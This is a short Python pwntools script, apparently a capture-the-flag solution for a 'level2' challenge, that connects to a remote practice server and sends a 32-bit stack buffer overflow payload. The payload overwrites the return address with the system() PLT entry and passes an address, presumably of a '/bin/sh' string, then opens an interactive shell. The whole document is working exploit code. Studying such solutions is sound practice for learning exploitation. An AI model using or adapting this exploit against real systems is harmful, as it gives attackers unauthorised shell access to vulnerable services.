from pwn import *

context.log_level='debug'

p=remote('node5.buuoj.cn',29433)
elf=ELF('/home/lixingjian/pwn/level2')

sys_plt=elf.symbols['system']

payload=b'a'*(0x88)+p32(0xdeadbeef)+p32(sys_plt)+p32(0xdeadbeef)+p32(0x804A024)

p.sendline(payload)

p.interactive()